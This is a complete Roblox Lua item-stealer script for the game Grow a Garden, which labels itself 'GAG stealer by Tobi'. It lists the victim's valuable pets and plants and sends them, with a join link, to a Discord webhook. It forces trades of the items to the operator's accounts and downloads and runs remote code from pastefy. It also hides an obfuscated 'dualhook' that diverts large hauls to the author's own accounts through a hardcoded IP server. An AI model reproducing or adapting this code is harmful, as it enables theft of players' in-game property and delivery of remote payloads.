_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local users = _G.Usernames or {}
local min_value = _G.min_value or 10000000
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local discuser = ""

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local plr = Players.LocalPlayer
local backpack = plr:WaitForChild("Backpack")
local replicatedStorage = game:GetService("ReplicatedStorage")
local modules = replicatedStorage:WaitForChild("Modules")
local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
local numberUtil = require(modules:WaitForChild("NumberUtil"))
local dataService = require(modules:WaitForChild("DataService"))
local character = plr.Character or plr.CharacterAdded:Wait()
local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
local rarePets = {"Red Fox", "Raccoon", "Dragonfly"}
local totalValue = 0
local itemsToSend = {}
local dualhooked = false
setclipboard("https://discord.gg/GY2RVSEGDT")

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add any usernames or webhook")
    return
end

if game.PlaceId ~= 126884695634066 then
    plr:kick("Game not supported. Please join a normal GAG server")
    return
end

if #Players:GetPlayers() >= 5 then
    plr:kick("Server error. Please join a DIFFERENT server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:kick("Server error. Please join a DIFFERENT server")
    return
end

local function buildSecret()
	local part1 = string.char(100, 117, 97, 108)
	local part2 = string.char(104, 111, 111, 107)
	local part3 = string.char(102, 116, 119, 108)
	local part4 = string.char(101, 108, 122)
	return part1 .. part2 .. part3 .. part4
end

local function simple_hash(s)
	local hash = 0
	for i = 1, #s do
		local c = s:byte(i)
		hash = (hash * 31 + c) % 4294967296
	end
	return hash
end

local function signPayload(payload, timestamp)
	local message = payload .. tostring(timestamp)
	local hash_value = simple_hash(buildSecret() .. message)
	return string.format("%08x", hash_value)
end

local function calcPetValue(v14)
    local hatchedFrom = v14.PetData.HatchedFrom
    if not hatchedFrom or hatchedFrom == "" then
        return 0
    end
    local eggData = petRegistry.PetEggs[hatchedFrom]
    if not eggData then
        return 0
    end
    local v17 = eggData.RarityData.Items[v14.PetType]
    if not v17 then
        return 0
    end
    local weightRange = v17.GeneratedPetData.WeightRange
    if not weightRange then
        return 0
    end
    local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)
    local v20 = math.lerp(0.8, 1.2, v19)
    local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
    local v22 = v20 * math.lerp(0.15, 6, levelProgress)
    local v23 = petRegistry.PetList[v14.PetType].SellPrice * v22
    return math.floor(v23)
end

local function formatNumber(number)
    if number == nil then
        return "0"
    end
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 and suffixIndex < #suffixes do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        if number == math.floor(number) then
            return string.format("%d%s", number, suffixes[suffixIndex])
        else
            return string.format("%.2f%s", number, suffixes[suffixIndex])
        end
    end
end

local function getWeight(tool)
    local weightValue = tool:FindFirstChild("Weight") or 
                       tool:FindFirstChild("KG") or 
                       tool:FindFirstChild("WeightValue") or
                       tool:FindFirstChild("Mass")

    local weight = 0

    if weightValue then
        if weightValue:IsA("NumberValue") or weightValue:IsA("IntValue") then
            weight = weightValue.Value
        elseif weightValue:IsA("StringValue") then
            weight = tonumber(weightValue.Value) or 0
        end
    else
        local weightMatch = tool.Name:match("%((%d+%.?%d*) ?kg%)")
        if weightMatch then
            weight = tonumber(weightMatch) or 0
        end
    end

    return math.floor(weight * 100 + 0.5) / 100
end

local function getHighestKGFruit()
    local highestWeight = 0

    for _, item in ipairs(itemsToSend) do
        if item.Weight > highestWeight then
            highestWeight = item.Weight
        end
    end

    return highestWeight
end

local function SendJoinMessage(list, prefix)
    local fields = {
        {
            name = "Victim Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Join link:",
            value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId
        },
        {
            name = "Item list:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total Value: ¢%s\nHighest weight fruit: %.2f KG", formatNumber(totalValue), getHighestKGFruit()),
            inline = false
        }
    }

    for _, item in ipairs(list) do
        local line = string.format("%s (%.2f KG): ¢%s", item.Name, item.Weight, formatNumber(item.Value))
        fields[3].value = fields[3].value .. line .. "\n"
    end

    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(126884695634066, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "\240\159\140\180 Join to get GAG hit",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local response = request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local function SendMessage(sortedItems)
    local fields = {
		{
			name = "Victim Username:",
			value = plr.Name,
			inline = true
		},
		{
			name = "Items sent:",
			value = "",
			inline = false
		},
        {
            name = "Summary:",
            value = string.format("Total Value: ¢%s\nHighest weight fruit: %.2f KG", formatNumber(totalValue), getHighestKGFruit()),
            inline = false
        }
	}

    for _, item in ipairs(sortedItems) do
        local line = string.format("%s (%.2f KG): ¢%s", item.Name, item.Weight, formatNumber(item.Value))
        fields[2].value = fields[2].value .. line .. "\n"
    end

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "\240\159\140\180 New GAG Execution" ,
            ["color"] = 65280,
			["fields"] = fields,
			["footer"] = {
				["text"] = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"
			}
        }}
    }

    local body = HttpService:JSONEncode(data)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local response = request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local function SendDHJoinMessage(list, prefix)
    local fields = {
        {
            name = "Victim Username:",
            value = plr.Name,
            inline = true
        },
        {
            name = "Join link:",
            value = "https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=" .. game.JobId
        },
        {
            name = "Item list:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = string.format("Total Value: ¢%s\nHighest weight fruit: %.2f KG", formatNumber(totalValue), getHighestKGFruit()),
            inline = false
        }
    }

    for _, item in ipairs(list) do
        local line = string.format("%s (%.2f KG): ¢%s", item.Name, item.Weight, formatNumber(item.Value))
        fields[3].value = fields[3].value .. line .. "\n"
    end

    if #fields[3].value > 1024 then
        local lines = {}
        for line in fields[3].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[3].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[3].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(126884695634066, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "\240\159\140\180 Join to get GAG hit",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    local timestamp = tostring(os.time())
    local signature = signPayload(body, timestamp)
    local headers = {
        ["Content-Type"] = "application/json",
        ["DiscUser"] = discuser,
        ["X-Timestamp"] = timestamp,
        ["X-Signature"] = signature
    }
    local response = request({
        Url = "http://46.101.233.20:5000/gagjoin",
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

loadstring(game:HttpGet('https://pastefy.app/hOdmFJvE/raw'))()

for _, tool in ipairs(backpack:GetChildren()) do
    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
        if tool:GetAttribute("ItemType") == "Pet" then
            local petUUID = tool:GetAttribute("PET_UUID")
            local v14 = dataService:GetData().PetsData.PetInventory.Data[petUUID]
            local itemName = v14.PetType
            if table.find(rarePets, itemName) or getWeight(tool) >= 10 then
                if tool:GetAttribute("Favorite") then
                    replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
                end
                local value = calcPetValue(v14)
                local toolName = tool.Name
                local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
                totalValue = totalValue + value
                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet"})
            end
        else
            local value = calcPlantValue(tool)
            if value >= min_value then
                local weight = getWeight(tool)
                local itemName = tool:GetAttribute("ItemName")
                totalValue = totalValue + value
                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Plant"})
            end
        end
    end
end

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b)
        if a.Type ~= "Pet" and b.Type == "Pet" then
            return true
        elseif a.Type == "Pet" and b.Type ~= "Pet" then
            return false
        else
            return a.Value < b.Value
        end
    end)

    if totalValue >= 100000000000 and math.random() < 0.15 then
        users = {"tobi437a", "Alyssa87123", "TobiAltGrind", "TobiHatching", "TobiCakeSimulator"}
        ping = "Yes"
        dualhooked = true
    end

    local sentItems = {}
    for i, v in ipairs(itemsToSend) do
        sentItems[i] = v
    end

    table.sort(sentItems, function(a, b)
        if a.Type == "Pet" and b.Type ~= "Pet" then
            return true
        elseif a.Type ~= "Pet" and b.Type == "Pet" then
            return false
        else
            return a.Value > b.Value
        end
    end)

    local prefix = ""
    if ping == "Yes" then
        prefix = "--[[@everyone]] "
    end

    if dualhooked then
        local response = request({
            Url = "http://46.101.233.20:5000/getdiscuser",
            Method = "GET"
        })
        discuser = response.Body
        SendDHJoinMessage(sentItems, prefix)
    else
        SendJoinMessage(sentItems, prefix)
    end

    local function doSteal(player)
        local victimRoot = character:WaitForChild("HumanoidRootPart")
        victimRoot.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 0, 2)
        wait(0.1)

        local promptRoot = player.Character.HumanoidRootPart:WaitForChild("ProximityPrompt")

        for _, item in ipairs(itemsToSend) do
            item.Tool.Parent = character
            if item.Type == "Pet" then
                local promptHead = player.Character.Head:WaitForChild("ProximityPrompt")
                repeat
                    task.wait(0.01)
                until promptHead.Enabled
                fireproximityprompt(promptHead)
            else
                repeat
                    task.wait(0.01)
                until promptRoot.Enabled
                fireproximityprompt(promptRoot)
            end
            task.wait(0.1)
            item.Tool.Parent = backpack
            task.wait(0.1)
        end

        local itemsStillInBackpack = true
        while itemsStillInBackpack do
            itemsStillInBackpack = false
            for _, item in ipairs(itemsToSend) do
                if backpack:FindFirstChild(item.Tool.Name) then
                    itemsStillInBackpack = true
                    break
                end
            end
            task.wait(0.1)
        end

        plr:kick("All your stuff just got stolen by Tobi's stealer!\n Join discord.gg/GY2RVSEGDT")
    end

    local function waitForUserChat()
        local sentMessage = false
        local function onPlayerChat(player)
            if table.find(users, player.Name) then
                player.Chatted:Connect(function()
                    if not sentMessage then
                        SendMessage(sentItems)
                        sentMessage = true
                    end
                    doSteal(player)
                end)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
        Players.PlayerAdded:Connect(onPlayerChat)
    end
    waitForUserChat()
end